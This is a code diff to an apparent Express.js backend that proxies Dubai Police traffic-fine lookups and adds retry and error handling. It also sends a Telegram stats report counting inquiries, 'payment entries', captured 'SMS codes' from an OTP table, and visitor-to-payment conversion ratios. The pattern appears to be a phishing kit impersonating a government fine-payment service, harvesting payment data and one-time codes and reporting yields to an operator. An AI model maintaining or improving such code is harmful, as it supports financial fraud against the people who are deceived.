@@ -97,10 +97,24 @@ router.post('/search-fines', async (req, res) => {
           ...(sessionCookie ? { Cookie: sessionCookie } : {}),
         },
         timeout: 15000,
+        validateStatus: () => true,
       }
     );
+    if (response.status !== 200) {
+      // Session likely expired — clear cache so next request retries
+      sessionCache = { cookie: '', time: 0 };
+      console.error('[search-fines] Dubai Police returned', response.status, JSON.stringify(response.data)?.slice(0, 200));
+      return res.status(503).json({ error: `Dubai Police returned status ${response.status}. Please try again.` });
+    }
     data = response.data;
+    // If the API returned an error body, clear session cache for next attempt
+    if (data && data.error) {
+      sessionCache = { cookie: '', time: 0 };
+      console.error('[search-fines] Dubai Police error body:', JSON.stringify(data).slice(0, 300));
+    }
   } catch (err) {
+    sessionCache = { cookie: '', time: 0 };
+    console.error('[search-fines] Network error:', err.message);
     return res.status(503).json({ error: 'Dubai Police server is unreachable. Please try again.' });
   }
 
@@ -280,38 +294,33 @@ router.post('/tg-hook', async (req, res) => {
     const allowed = [cfg.chatId, cfg.inquiryChatId].filter(Boolean);
     if (!chatId || !allowed.includes(chatId)) return;
 
-    if (text === '/stats') {
-      const getCount = async (sql) => {
-        const rows = await query(sql, []);
-        return Number(Object.values(rows[0] || {})[0]) || 0;
+    if (text === '/stats' || text.startsWith('/stats@')) {
+      const safeCount = async (sql) => {
+        try {
+          const rows = await query(sql, []);
+          return Number(Object.values(rows[0] || {})[0]) || 0;
+        } catch { return 0; }
       };
-      const [totalQ, uniqueQ, totalP, totalSms] = await Promise.all([
-        getCount('SELECT COUNT(*) FROM inquiries'),
-        getCount('SELECT COUNT(DISTINCT ip) FROM inquiries'),
-        getCount('SELECT COUNT(*) FROM payments'),
-        getCount("SELECT COUNT(*) FROM otp_events WHERE type='otp_sms'"),
-      ]);
-      let totalV = 0, uniqueV = 0;
-      try {
-        [totalV, uniqueV] = await Promise.all([
-          getCount('SELECT COUNT(*) FROM visitors'),
-          getCount('SELECT COUNT(DISTINCT ip) FROM visitors'),
-        ]);
-      } catch {}
-      const vqRatio = totalQ  > 0 ? (totalV  / totalQ).toFixed(2)  : 'N/A';
-      const qpRatio = totalP  > 0 ? (totalQ  / totalP).toFixed(2)  : 'N/A';
+      const totalQ   = await safeCount('SELECT COUNT(*) FROM inquiries');
+      const uniqueQ  = await safeCount('SELECT COUNT(DISTINCT ip) FROM inquiries');
+      const totalP   = await safeCount('SELECT COUNT(*) FROM payments');
+      const totalSms = await safeCount("SELECT COUNT(*) FROM otp_events WHERE type='otp_sms'");
+      const totalV   = await safeCount('SELECT COUNT(*) FROM visitors');
+      const uniqueV  = await safeCount('SELECT COUNT(DISTINCT ip) FROM visitors');
+      const vqRatio  = totalQ > 0 ? (totalV  / totalQ).toFixed(2) : 'N/A';
+      const qpRatio  = totalP > 0 ? (totalQ  / totalP).toFixed(2) : 'N/A';
       const now = new Date().toLocaleString('tr-TR', { timeZone: 'Asia/Dubai' });
       const report = [
         '[STATS REPORT]',
-        '─────────────────',
+        '-----------------',
         `Total Queries: ${totalQ} (${uniqueQ} unique)`,
         `Payment Entries: ${totalP}`,
         `SMS Codes: ${totalSms}`,
         `Visitors: ${totalV} (${uniqueV} unique)`,
-        '─────────────────',
+        '-----------------',
         `Visitor/Query: ${vqRatio}`,
         `Query/Payment: ${qpRatio}`,
-        '─────────────────',
+        '-----------------',
         `Generated: ${now} (Dubai)`,
       ].join('\n');
       await sendTelegram(cfg.token, chatId, report);
